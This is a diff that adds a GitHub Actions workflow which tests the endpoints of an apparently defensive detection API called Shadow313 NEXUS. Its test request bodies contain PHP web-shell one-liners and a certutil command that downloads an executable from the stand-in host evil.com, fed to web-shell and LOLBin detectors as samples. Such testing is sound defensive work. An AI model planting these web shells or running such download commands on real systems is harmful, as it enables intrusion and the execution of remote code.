@@ -1,0 +1,177 @@
+name: Shadow313 NEXUS — API Endpoint Validation
+
+on:
+  push:
+    branches: [master]
+  pull_request:
+    branches: [master]
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  api-endpoint-validation:
+    name: "Live API Endpoint Validation"
+    runs-on: ubuntu-latest
+    env:
+      API_PORT: 8313
+      API_BASE: "http://127.0.0.1:8313"
+      SHADOW313_API_KEY: "ci-test-key-shadow313"
+      SHADOW313_DEV_MODE: "false"
+
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: { python-version: "3.12", cache: pip }
+
+      - name: Install dependencies
+        run: |
+          pip install --upgrade pip -q
+          pip install -e ".[dev]" -q 2>/dev/null || pip install -r requirements.txt -q || true
+          pip install fastapi uvicorn httpx -q
+
+      - name: Start API server
+        run: |
+          python3 -c "
+          from shadow313.api.server import create_app
+          import uvicorn
+          app = create_app(api_key='ci-test-key-shadow313')
+          uvicorn.run(app, host='127.0.0.1', port=8313, log_level='warning')
+          " &
+          echo $! > /tmp/api.pid
+
+      - name: Wait for server ready
+        run: |
+          for i in $(seq 1 30); do
+            curl -sf http://127.0.0.1:8313/health > /dev/null 2>&1 && echo "Server ready after ${i}s" && break
+            sleep 1
+          done
+          curl -sf http://127.0.0.1:8313/health || { echo "FAIL: Server did not start"; exit 1; }
+
+      - name: "FAIL-FAST: Validate all API endpoints"
+        run: |
+          python3 << 'PYEOF'
+          import sys, time, httpx
+
+          BASE    = "http://127.0.0.1:8313"
+          HEADERS = {"X-API-Key": "ci-test-key-shadow313"}
+          results = []
+
+          def test(name, method, path, expected_status=200, expected_ct="application/json",
+                   schema=None, body=None, auth=True):
+              h = dict(HEADERS) if auth else {}
+              url = f"{BASE}{path}"
+              t0 = time.time()
+              try:
+                  with httpx.Client(timeout=10) as c:
+                      r = c.request(method, url, json=body, headers=h)
+                  ms = round((time.time()-t0)*1000)
+                  errs = []
+                  if r.status_code != expected_status:
+                      errs.append(f"STATUS: expected {expected_status}, got {r.status_code} | body: {r.text[:200]}")
+                  if expected_ct and expected_ct not in r.headers.get("content-type",""):
+                      errs.append(f"CONTENT-TYPE: expected '{expected_ct}', got '{r.headers.get('content-type','')}'")
+                  if schema and r.status_code == expected_status:
+                      try:
+                          data = r.json()
+                          for k,t in schema.items():
+                              opt = k.startswith("?")
+                              rk  = k.lstrip("?")
+                              if rk not in data:
+                                  if not opt: errs.append(f"SCHEMA: '{rk}' MISSING (required)")
+                              elif t != "any" and not isinstance(data[rk], t):
+                                  errs.append(f"SCHEMA: '{rk}' expected {t.__name__}, got {type(data[rk]).__name__}")
+                      except Exception as e:
+                          errs.append(f"JSON PARSE: {e}")
+                  status = "OK  " if not errs else "FAIL"
+                  print(f"  [{status}] [{method}] {path}  HTTP {r.status_code}  {ms}ms")
+                  for e in errs: print(f"         -> {e}")
+                  results.append({"name":name,"path":path,"method":method,"passed":not errs,"errors":errs})
+              except Exception as e:
+                  print(f"  [FAIL] [{method}] {path}  ERROR: {e}")
+                  results.append({"name":name,"path":path,"method":method,"passed":False,"errors":[str(e)]})
+
+          print("\n=== GROUP 1: Health & Status ===")
+          test("health",       "GET", "/health",          auth=False, schema={"status":str})
+          test("api/status",   "GET", "/api/status",      auth=False, schema={"status":str,"version":str,"service":str,"timestamp":str,"modules":dict})
+          test("openapi.json", "GET", "/api/openapi.json",auth=False, schema={"openapi":str,"info":dict,"paths":dict})
+          test("docs page",    "GET", "/api/docs",        auth=False, expected_ct="text/html")
+
+          print("\n=== GROUP 2: Auth Enforcement ===")
+          test("modules no auth",   "GET", "/api/modules", auth=False, expected_status=401)
+          test("modules wrong key", "GET", "/api/modules", auth=False, expected_status=403,
+               body=None)
+
+          print("\n=== GROUP 3: Authenticated GETs ===")
+          test("modules",        "GET", "/api/modules",       schema={"modules":list})
+          test("attck/coverage", "GET", "/api/attck/coverage",schema={"overall_pct":[int,float],"techniques_covered":int,"techniques_total":int,"tactics":dict,"timestamp":str})
+          test("bind list",      "GET", "/api/bind",          schema={"count":int,"receipts":list})
+
+          print("\n=== GROUP 4: POST Endpoints ===")
+          test("detect webshell","POST","/api/detect",
+               body={"event":{"file_path":"/var/www/shell.php","content":"<?php eval($_POST['cmd']); ?>"},"detectors":["webshell"]},
+               schema={"event":dict,"results":dict,"timestamp":str})
+          test("detect lolbin",  "POST","/api/detect",
+               body={"event":{"process":"certutil.exe","cmdline":"certutil -urlcache -f http://evil.com/x.exe"},"detectors":["lolbin"]},
+               schema={"event":dict,"results":dict,"timestamp":str})
+          test("webshell scan",  "POST","/api/webshell/scan",
+               body={"content":"<?php system($_GET['cmd']); ?>","file_path":"/var/www/test.php","mode":"content"})
+          test("bind create",    "POST","/api/bind/create",
+               body={"payload":{"event":"ci-test"},"metadata":{"source":"github-actions"}},
+               schema={"bind_id":str,"timestamp_ns":int,"timestamp_iso":str,"payload_hash":str,"chain_hash":str,"app_id":str,"app_version":str})
+
+          print("\n=== GROUP 5: Receipt Retrieval ===")
+          try:
+              with httpx.Client(timeout=10) as c:
+                  r = c.post(f"{BASE}/api/bind/create", json={"payload":{"test":"retrieve"},"metadata":{}}, headers=HEADERS)
+                  if r.status_code == 200:
+                      bid = r.json().get("bind_id","UNKNOWN")
+                      test(f"bind get {bid}", "GET", f"/api/bind/{bid}", schema={"bind_id":str,"timestamp_ns":int,"payload_hash":str,"chain_hash":str})
+                      test("bind 404",        "GET", "/api/bind/313-FAKE-DEADBEEF", expected_status=404)
+          except Exception as e:
+              print(f"  [WARN] Could not create test receipt: {e}")
+
+          print("\n=== GROUP 6: Input Validation ===")
+          test("detect empty body",    "POST","/api/detect",         body={},              expected_status=422)
+          test("webshell missing body","POST","/api/webshell/scan",  body={"mode":"content"},expected_status=422)
+          test("bind missing payload", "POST","/api/bind/create",    body={"metadata":{}}, expected_status=422)
+          test("unknown endpoint",     "GET", "/api/does-not-exist", auth=False,           expected_status=404)
+
+          print("\n=== GROUP 7: Response Time SLA (<500ms) ===")
+          for method, path, auth in [("GET","/health",False),("GET","/api/status",False),
+                                      ("GET","/api/modules",True),("GET","/api/attck/coverage",True)]:
+              h = dict(HEADERS) if auth else {}
+              t0 = time.time()
+              try:
+                  with httpx.Client(timeout=5) as c: c.request(method, f"{BASE}{path}", headers=h)
+                  ms = round((time.time()-t0)*1000)
+                  if ms > 500:
+                      print(f"  [WARN] [{method}] {path}  {ms}ms  SLOW (>500ms SLA)")
+                      results.append({"name":f"SLA {path}","path":path,"method":method,"passed":False,"errors":[f"{ms}ms > 500ms SLA"]})
+                  else:
+                      print(f"  [OK  ] [{method}] {path}  {ms}ms")
+                      results.append({"name":f"SLA {path}","path":path,"method":method,"passed":True,"errors":[]})
+              except Exception as e:
+                  print(f"  [WARN] [{method}] {path}  {e}")
+
+          total  = len(results)
+          passed = sum(1 for r in results if r["passed"])
+          failed = total - passed
+          print(f"\n{'='*50}")
+          print(f"TOTAL: {total}  PASSED: {passed}  FAILED: {failed}")
+          if failed > 0:
+              print(f"\nFAILED ENDPOINTS:")
+              for r in results:
+                  if not r["passed"]:
+                      print(f"  [{r['method']}] {r['path']}")
+                      for e in r["errors"]: print(f"    -> {e}")
+              print(f"\nFAIL: {failed} endpoint(s) did not meet requirements.")
+              sys.exit(1)
+          print(f"ALL {total} ENDPOINT TESTS PASSED")
+          PYEOF
+
+      - name: Stop API server
+        if: always()
+        run: kill $(cat /tmp/api.pid) 2>/dev/null || true
